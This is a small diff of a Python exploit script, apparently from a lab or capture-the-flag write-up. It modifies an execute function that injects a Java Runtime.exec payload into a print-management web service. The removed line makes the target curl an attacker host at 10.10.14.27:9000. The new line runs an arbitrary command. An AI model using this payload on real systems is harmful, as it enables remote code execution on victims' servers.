@@ -289,7 +289,7 @@ def execute(base_url, session, command):
 //改为
 def execute(base_url, session, command):
     print('[*] Prepparing to execute...')
-    postback = "java.lang.Runtime.getRuntime().exec('/bin/bash -c \"curl http://10.10.14.27:9000\"');"
+    postback = "java.lang.Runtime.getRuntime().exec('{command}');"
     headers = {'Origin': f'{base_url}'}
     data = {
         'service': 'page/PrinterList'
